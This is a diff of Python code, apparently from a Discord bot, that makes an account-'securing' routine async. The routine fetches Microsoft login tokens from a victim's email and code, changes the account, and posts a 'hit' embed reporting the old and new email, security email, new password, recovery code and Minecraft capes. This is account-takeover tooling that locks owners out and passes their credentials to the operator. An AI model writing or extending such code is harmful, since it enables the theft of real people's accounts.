@@ -6,18 +6,15 @@ from views.utils.securing.secure import secure
 
 from discord import Embed
 
-import json
 import time
 
-def startSecuringAccount(email: str, device: str = None, code: str = None):
+async def startSecuringAccount(email: str, device: str = None, code: str = None):
     
-    data = getLiveData() # {urlPost, ppft, cookies, headers}
-
-    print(f"PPFT: {data["ppft"]}")
+    data = await getLiveData() # {urlPost, ppft, cookies, headers}
 
     # str or None | dict
     # urlPost, ppft
-    msaauth = getMSAAUTH(email, device, data, code)
+    msaauth = await getMSAAUTH(email, device, data, code)
 
     # WLSSC = getWLSSC(msaauth, urlPost, ppft)
     
@@ -27,7 +24,7 @@ def startSecuringAccount(email: str, device: str = None, code: str = None):
     
     print("[+] - Got MSAAUTH | Starting to secure...")
     initialTime = time.time()
-    account = secure(msaauth)
+    account = await secure(msaauth)
     print(account)
 
     finalTime = (time.time() - initialTime)
@@ -50,7 +47,7 @@ def startSecuringAccount(email: str, device: str = None, code: str = None):
     hitEmbed.add_field(name="🛠 Method", value=f"```{account['method']}```", inline=True)
     hitEmbed.add_field(name="🎽 Capes", value=f"```{account['capes']}```", inline=True)
     hitEmbed.add_field(name="📧 Old Email", value=f"```{account['oldEmail']}```", inline=False)
-    hitEmbed.add_field(name="📧 Email", value=f"```{account['email']}```", inline=False)
+    hitEmbed.add_field(name="📧 New Email", value=f"```{account['email']}```", inline=False)
     hitEmbed.add_field(name="📩 Security Email", value=f"```{account['secEmail']}```", inline=True)
     hitEmbed.add_field(name="🔒 Password", value=f"```{account['password']}```", inline=False)
     hitEmbed.add_field(name="🧯 Recovery Code", value=f"```{account['recoveryCode']}```", inline=False)
